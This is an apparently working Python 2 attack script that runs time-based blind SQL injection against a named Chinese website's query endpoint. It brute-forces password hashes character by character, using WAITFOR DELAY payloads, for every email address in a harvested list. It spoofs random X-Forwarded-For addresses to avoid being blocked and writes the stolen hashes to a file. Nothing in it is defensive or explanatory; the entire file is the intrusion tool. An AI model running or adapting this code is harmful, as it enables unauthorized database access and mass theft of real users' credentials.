import string
import requests
import time
import random

def get_secret(pwd):
	s='0123456789abcdef'
	cur_secret=''
	while(len(cur_secret)<32):
		start=0
		end=len(s)
		mid=0
		while(start<end):
			mid=(start+end)/2
			t=check_secret(len(cur_secret)+1,ord(s[mid]),pwd)
			if t:
				end=mid
			else:
				start=mid
			if start==end-1:
				t=check_secret(len(cur_secret)+1,ord(s[start]),pwd)
				if not t:
					cur_secret+=s[end]
				else:
					cur_secret+=s[start]
				break
		print cur_secret
	return cur_secret


def check_secret(pos,ch_n,pwd):
	url='http://www.iuka.cn/chaxun'
	# con="123';if(ascii(substring(db_name(),{},1)))>{}/**/WAITFOR/**/DELAY/**/'0:0:3'-- ".format(pos,ch_n)
	#con="123';if(ascii(substring((select/**/ayanquan/**/from/**/ayname/**/where/**/aypassword='{}'),{},1)))>{}/**/WAITFOR/**/DELAY/**/'0:0:1'-- ".format(pwd,pos,ch_n)
	# print con
	con="123';if(ascii(substring((select/**/aypassword/**/from/**/ayname/**/where/**/aymail='{}'),{},1)))>{}/**/WAITFOR/**/DELAY/**/'0:0:1'-- ".format(mail,pos,ch_n)
	data={
		'con':con,
		'act':'cha'
	}
	headers={
	'X-Forwarded-For':'.'.join([str(random.randint(1,255)),str(random.randint(1,255)),str(random.randint(1,255)),str(random.randint(1,255))])
	}
	t1=time.time()
	r=requests.post(url,data=data,headers=headers)
	t2=time.time()
	btw=t2-t1
	if btw>2:
		return False
	else:
		return True
#print get_secret('dc483e80a7a0bd9ef71d8cf973673924')

if __name__=='__main__':
	f=open('/root/aymail.txt','r')
	mail_list=f.read()[2:-2].split("', '")
	f.close()
	f1=open('/root/aypassword.txt','w')
	for mail in mail_list:
		print mail
		tmp=get_secret(mail);
		f1.write(tmp+'\n')
	f1.close()
